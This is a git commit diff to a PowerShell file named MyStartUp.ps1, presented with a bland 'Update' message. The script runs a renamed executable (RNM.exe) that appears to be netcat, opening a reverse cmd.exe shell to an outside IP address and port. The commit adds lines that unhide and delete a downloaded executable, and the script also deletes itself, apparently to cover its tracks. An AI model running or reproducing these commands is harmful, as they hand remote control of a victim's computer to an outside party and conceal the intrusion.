f2b513f6bc0b1370b90c5c09ad0ddc4eb6706a8a
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-03-18 22:58:00 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,5 +1,7 @@
 #taskkill /F /IM lml.exe
 #C:\Users\ana\Downloads\lml.exe
+attrib -h C:\Users\alooo\Downloads\lml.exe
+del C:\Users\alooo\Downloads\lml.exe
 C:\Users\Public\RNM.exe -nv 193.161.193.99 61030 -e cmd.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
